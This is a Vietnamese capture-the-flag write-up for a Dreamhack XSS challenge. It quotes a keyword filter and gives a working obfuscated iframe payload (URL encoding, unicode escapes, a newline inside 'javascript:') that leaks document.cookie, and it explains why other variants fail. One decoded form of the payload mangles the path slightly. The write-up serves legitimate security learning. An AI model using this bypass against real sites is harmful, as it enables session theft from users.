---
title: XSS Filtering Bypass Advanced
date: 2026-11-03
ctf: Dreamhack
category: web
difficulty: Silver 3
tags:
  - XSS
  - Reflected XSS
  - Filter Bypass
  - Cookie Stealing
  - URL Encoding
---

# Đề bài
Exercise: Patched issue with XSS Filtering Bypass.
https://dreamhack.io/wargame/challenges/434
# Solution
Nhìn source và kiểm tra lớp filter
```python
def xss_filter(text):
    _filter = ["script", "on", "javascript"]
    for f in _filter:
        if f in text.lower():
            return "filtered!!!"

    advanced_filter = ["window", "self", "this", "document", "location", "(", ")", "&#"]
    for f in advanced_filter:
        if f in text.lower():
            return "filtered!!!"
```
-> Không được sử dụng `["script", "on", "javascript","window", "self", "this", "document", "location", "(", ")", "&#"]`

-> Payload:
```html
<iframe+src%3d"javascrip%250At%3alocati\u006fn%3d'/memo%3fmemo%3d'%2bdocu\u006dent.cookie"></iframe>
```
<=>
```html
<iframe+src="javascrip%0At:locati\u006fn='/memo=memo?'%2bdocu\u006dent.cookie"></iframe>
```
<=>
```html
<iframe src="javascrip
t:location='/memo?memo='+document.cookie"></iframe>
```
Payload trên sử dụng `URL encoding`, `UNICODE escape` kết hợp với các dòng xuống hàng trong `javascript:` giúp né filter; trình duyệt bỏ chúng khi xử lý URL

1. `+` -> Space, `%0A` -> Newline, `%2b` -> `+`
2. `\u006f` -> `o`, `\u006d` -> `m`

Note:

1. 
:::warning
Trong payload, `javascript:` nằm trong thuộc tính `src` của `<iframe>`, nên trình duyệt xử lý nó như URL của frame
Còn `<img>` chỉ tải và giải mã dữ liệu ảnh; nó không tạo một trang JavaScript để thực thi. Vì vậy `javascript:` trong `img` `src` không chạy script.
:::
2. 
:::warning
`<scri%0At>locati\u006fn.href='/memo=memo?'%2bdocu\u006dent.cookie</scri%0At>` có được không?
-> Không chạy được. `%0A` sẽ thành xuống dòng, nhưng trong tên thẻ HTML xuống dòng kết thúc tên thẻ: `<scri%0At>` được hiểu gần như thẻ `<scri>` có thuộc tính `t`, chứ không phải `<script>`. Trình duyệt chỉ bỏ xuống dòng trong `URL scheme` như `javascript:`, không nối lại tên thẻ HTML.
:::
:::info
`URL scheme` là phần đứng trước dấu `:` trong một URL, cho biết URL dùng cách truy cập nào. Ví dụ:
- `https`: trong ==https==`://example.com`
- `data`: trong ==data==`:text/html,...`
- `javascript`: trong ==javascript==`:alert(1)`
:::
